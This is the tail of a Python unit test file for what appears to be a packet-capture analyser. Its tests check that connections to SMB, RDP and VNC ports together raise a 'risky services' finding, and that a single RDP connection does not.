    def test_combination_of_services(self):
        b = PcapBuilder()
        for i, port in enumerate((445, 3389, 5900)):
            tcp_conversation(b, T0 + i * 10, "10.8.0.5", 41000 + i, "10.8.0.9", port)
        self.assertEqual([f["name"] for f in of(run(b), "risky_services")], ["Unusual combination of administrative services"])

    def test_single_rdp_connection_is_quiet(self):
        b = PcapBuilder()
        tcp_conversation(b, T0, "10.8.0.5", 41000, "10.8.0.9", 3389)
        self.assertNotIn("risky_services", ids(run(b)))


if __name__ == "__main__":
    unittest.main()
